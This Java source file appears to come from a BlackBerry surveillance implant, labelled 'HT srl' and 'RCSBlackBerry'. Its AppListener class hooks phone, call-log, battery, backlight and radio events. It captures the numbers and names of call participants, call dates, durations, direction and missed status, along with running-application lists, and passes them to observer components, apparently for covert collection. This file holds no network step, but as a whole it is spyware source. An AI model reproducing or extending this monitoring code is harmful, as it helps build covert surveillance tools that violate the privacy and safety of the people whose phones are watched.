//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.HolsterListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.SystemListener;
import net.rim.device.api.system.SystemListener2;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.interfaces.CallListObserver;
import blackberry.interfaces.Observer;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.interfaces.Singleton;
import blackberry.log.Log;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener implements RadioStatusListener, HolsterListener,
        SystemListener, SystemListener2, PhoneListener, PhoneLogListener,
        Singleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);
    //#endif

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationListObservers = new Vector();
    Vector backlightObservers = new Vector();
    Vector phoneCallObservers = new Vector();
    Vector callListObservers = new Vector();

    Task task;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {
        lastStatus = DeviceInfo.getBatteryStatus();
        task = Task.getInstance();

        //ScreenFake.Push();
    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = new AppListener();
        }
        return instance;
    }

    /**
     * Adds the observer.
     * 
     * @param observers
     *            Vector of observers
     * @param observer
     *            the observer
     */
    public synchronized void addObserver(final Vector observers,
            final Observer observer) {

        //#ifdef DBC
        Check.requires(!observers.contains(observer), "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);
        //#endif
        if (!observers.contains(observer)) {
            observers.addElement(observer);
        }
    }

    /**
     * Removes observer.
     * 
     * @param observers
     *            Vector of observers
     * @param observer
     *            the observer
     */
    public synchronized void removeObserver(final Vector observers,
            final Observer observer) {
        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (observers.contains(observer)) {
            observers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            //debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    public synchronized void addBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        addObserver(batteryStatusObservers, observer);
    }

    public synchronized void removeBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        removeObserver(batteryStatusObservers, observer);

    }

    public synchronized void addApplicationListObserver(
            final ApplicationListObserver observer) {
        addObserver(applicationListObservers, observer);
    }

    public synchronized void removeApplicationListObserver(
            final ApplicationListObserver observer) {
        removeObserver(applicationListObservers, observer);
    }

    public synchronized void addBacklightObserver(
            final BacklightObserver observer) {
        addObserver(backlightObservers, observer);
    }

    public synchronized void removeBacklightObserver(
            final BacklightObserver observer) {
        removeObserver(backlightObservers, observer);
    }

    public synchronized void addPhoneCallObserver(
            final PhoneCallObserver observer) {
        addObserver(phoneCallObservers, observer);
    }

    public synchronized void removePhoneCallObserver(
            final PhoneCallObserver observer) {
        removeObserver(phoneCallObservers, observer);
    }

    public synchronized void addCallListObserver(final CallListObserver observer) {
        addObserver(callListObservers, observer);
    }

    public synchronized void removeCallListObserver(
            final CallListObserver observer) {
        removeObserver(callListObservers, observer);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#baseStationChange()
     */
    public void baseStationChange() {
        //#ifdef DEBUG_INFO
        debug.info("baseStationChange");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryGood()
     */
    public void batteryGood() {
        //#ifdef DEBUG_INFO
        debug.info("batteryGood");
        //#endif
        
        Log.info("BatteryGood", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryLow()
     */
    public void batteryLow() {
        //#ifdef DEBUG_INFO
        debug.info("batteryLow");
        //#endif
        
        Log.info("BatteryLow", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    public synchronized void batteryStatusChange(final int status) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("batteryStatusChange arg: " + status);
        //#endif

        final int diff = (status ^ lastStatus);

        final int size = batteryStatusObservers.size();
        for (int i = 0; i < size; i++) {

            final BatteryStatusObserver observer = (BatteryStatusObserver) batteryStatusObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBatteryStatusChange(status, diff);
        }

        lastStatus = status;
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    /**
     * Application list change.
     * 
     * @param startedList
     *            the started list
     * @param stoppedList
     *            the stopped list
     * @param stoppedListMod
     * @param startedListMod
     */
    public synchronized void applicationListChange(
            final Vector startedListName, final Vector stoppedListName,
            final Vector startedListMod, final Vector stoppedListMod) {
        //#ifdef DEBUG_INFO
        debug.info("applicationListChange start: " + startedListName.size()
                + " stopped: " + stoppedListName.size());
        //#endif

        //#ifdef DBC
        Check.requires(startedListName.size() == startedListMod.size(),
                "applicationListChange");
        Check.requires(stoppedListName.size() == stoppedListMod.size(),
                "applicationListChange");
        //#endif

        final int size = applicationListObservers.size();
        for (int i = 0; i < size; i++) {

            final ApplicationListObserver observer = (ApplicationListObserver) applicationListObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onApplicationListChange(startedListName, stoppedListName,
                    startedListMod, stoppedListMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#inHolster()
     */
    public void inHolster() {
        init();

        //#ifdef DEBUG_INFO
        debug.info("inHolster");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#outOfHolster()
     */
    public void outOfHolster() {
        init();

        //#ifdef DEBUG_INFO
        debug.info("outOfHolster");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkScanComplete(boolean
     * )
     */
    public void networkScanComplete(final boolean success) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("networkScanComplete success: " + success);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkServiceChange(int,
     * int)
     */
    public void networkServiceChange(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkServiceChange networkId: " + networkId
                + " service : " + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#networkStarted(int,
     * int)
     */
    public void networkStarted(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkStarted networkId: " + networkId + " service : "
                + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkStateChange(int)
     */
    public void networkStateChange(final int state) {
        //#ifdef DEBUG_INFO
        debug.info("networkStateChange state: " + state);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#pdpStateChange(int,
     * int, int)
     */
    public void pdpStateChange(final int apn, final int state, final int cause) {
        //#ifdef DEBUG_INFO
        debug.info("pdpStateChange apn: " + apn + " state: " + state
                + "cause :" + cause);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerOff()
     */
    public void powerOff() {
        Log.info("PowerOff", DebugLevel.INFORMATION);
        //#ifdef DEBUG_INFO
        debug.info("powerOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerUp()
     */
    public void powerUp() {
        Log.info("PowerUp", DebugLevel.INFORMATION);
        //#ifdef DEBUG_INFO
        debug.info("powerUp");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#radioTurnedOff()
     */
    public void radioTurnedOff() {
        //#ifdef DEBUG_INFO
        debug.info("radioTurnedOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#signalLevel(int)
     */
    public void signalLevel(final int level) {
        //#ifdef DEBUG_INFO
        debug.info("signalLevel: " + level);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("backlightStateChange: " + on);
        //#endif

        final int size = backlightObservers.size();
        for (int i = 0; i < size; i++) {

            final BacklightObserver observer = (BacklightObserver) backlightObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBacklightChange(on);
        }

        if (on) {
            // riprende l'analisi degli applicativi
            // se c'e' una variazione nella lista comunica la lista agli observer
            // viene fatto con un timer
            task.resumeApplicationTimer();
        } else {
            // interrompe l'analisi degli applicativi
            task.suspendApplicationTimer();
        }

        // Verifica dei timers di task
        Task.getInstance().verifyTimers();
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#cradleMismatch(boolean)
     */
    public void cradleMismatch(final boolean mismatch) {
        //#ifdef DEBUG_INFO
        debug.info("cradleMismatch: " + mismatch);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#fastReset()
     */
    public void fastReset() {
        //#ifdef DEBUG_INFO
        debug.info("fastReset");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#powerOffRequested(int)
     */
    public void powerOffRequested(final int reason) {
        //#ifdef DEBUG_INFO
        debug.info("powerOffRequested: " + reason);
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#usbConnectionStateChange(int)
     */
    public void usbConnectionStateChange(final int state) {
        //#ifdef DEBUG_INFO
        debug.info("usbConnectionStateChange: " + state);
        //#endif
    }

    public void callAdded(int arg0) {
        //#ifdef DEBUG_INFO
        debug.info("callAddedd: " + arg0);
        //#endif
    }

    public void callConferenceCallEstablished(int arg0) {
        //#ifdef DEBUG_INFO
        debug.info("callConferenceCallEstablished: " + arg0);
        //#endif
    }

    public void callDirectConnectConnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callDirectConnectConnected: " + callId);
        //#endif
    }

    public void callDirectConnectDisconnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callDirectConnectDisconnected: " + callId);
        //#endif
    }

    public void callEndedByUser(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callEndedByUser: " + callId);
        //#endif
    }

    public void callFailed(int callId, int reason) {
        //#ifdef DEBUG_INFO
        debug.info("callFailed: " + callId);
        //#endif

    }

    public void callHeld(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callHeld: " + callId);
        //#endif
    }

    public void callInitiated(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callInitiated: " + callId);
        //#endif

    }

    public void callRemoved(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callRemoved: " + callId);
        //#endif
    }

    public void callResumed(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callResumed: " + callId);
        //#endif
    }

    public void callWaiting(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callWaiting: " + callId);
        //#endif
    }

    public void conferenceCallDisconnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("conferenceCallDisconnected: " + callId);
        //#endif
    }

    public void callIncoming(int callId) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("callIncoming: " + callId);
        //#endif

        PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = phoneCall.getDisplayPhoneNumber();
        boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallIncoming(callId, phoneNumber);
            }
        }

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }

    }

    public void callConnected(int callId) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("callConnected: " + callId);
        //#endif

        PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = phoneCall.getDisplayPhoneNumber();
        boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallConnected(callId, phoneNumber);
            }
        }

    }

    public void callAnswered(int callId) {
        init();

        //#ifdef DEBUG_INFO
        debug.info("callAnswered: " + callId);
        //#endif

        PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallAnswered(callId, phoneNumber);
            }
        }

    }

    Hashtable callingHistory = new Hashtable();

    public void callDisconnected(int callId) {
        init();
        boolean outgoing = false;
        //#ifdef DEBUG_INFO
        debug.info("callDisconnected: " + callId);
        //#endif

        PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = null;

        if (phoneCall != null) {

            phoneNumber = phoneCall.getDisplayPhoneNumber();
            outgoing = phoneCall.isOutgoing();

        } else {

            synchronized (callingHistory) {
                if (callingHistory.containsKey(new Integer(callId))) {
                    phoneNumber = (String) callingHistory.get(new Integer(
                            callId));
                    callingHistory.remove(new Integer(callId));
                }
            }

            //#ifdef DEBUG_TRACE
            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
            //#endif
        }

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallDisconnected(callId, phoneNumber);
            }
        }
    }

    public void callLogAdded(CallLog callLog) {
        init();

        String notes = callLog.getNotes();
        //#ifdef DEBUG_TRACE
        debug.trace("callLogAdded: " + callLog.toString() + " notes: " + notes);
        //#endif            

        PhoneLogs phoneLogs = PhoneLogs.getInstance();

        if (PhoneCallLog.class.isAssignableFrom(callLog.getClass())) {
            PhoneCallLog phoneCallLog = (PhoneCallLog) callLog;
            PhoneCallLogID logID = phoneCallLog.getParticipant();
            //#ifdef DEBUG_TRACE
            debug.trace("date: " + callLog.getDate() + " number: "
                    + logID.getNumber());
            //#endif 

            int type = phoneCallLog.getType();
            int status = callLog.getStatus();

            String phoneNumber = "";
            String phoneName = null;
            PhoneCallLogID partecipant = phoneCallLog.getParticipant();
            if (partecipant != null) {
                phoneNumber = partecipant.getNumber();
                phoneName = partecipant.getName();
            }

            if (phoneName == null) {
                phoneName = "";
            }

            //#ifdef DEBUG_INFO
            debug.info("number: " + phoneNumber + " type: " + type
                    + " status: " + status);
            //#endif

            boolean outgoing = false;
            boolean missed = false;

            if (type == PhoneCallLog.TYPE_PLACED_CALL) {
                outgoing = true;
            } else if (type == PhoneCallLog.TYPE_RECEIVED_CALL) {
                outgoing = false;
            }

            if (type == PhoneCallLog.TYPE_MISSED_CALL_OPENED
                    || type == PhoneCallLog.TYPE_MISSED_CALL_UNOPENED) {
                outgoing = false;
            }

            missed = phoneCallLog.getDuration() == 0;
            
            final int size = callListObservers.size();
            for (int i = 0; i < size; i++) {

                final CallListObserver observer = (CallListObserver) callListObservers
                        .elementAt(i);
                //#ifdef DEBUG_TRACE
                debug.trace("notify: " + observer);
                //#endif

                observer.callLogAdded(phoneNumber, phoneName,
                        callLog.getDate(), phoneCallLog.getDuration(),
                        outgoing, missed);

            }
        }
    }

    public void callLogRemoved(CallLog arg0) {
        init();

        //#ifdef DEBUG_TRACE
        debug.trace("callLogRemoved: " + arg0.getDate());
        //#endif
    }

    public void callLogUpdated(CallLog arg0, CallLog arg1) {
        // TODO Auto-generated method stub

    }

    public void reset() {
        Log.info("Reset", DebugLevel.INFORMATION);
        // TODO Auto-generated method stub
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

}
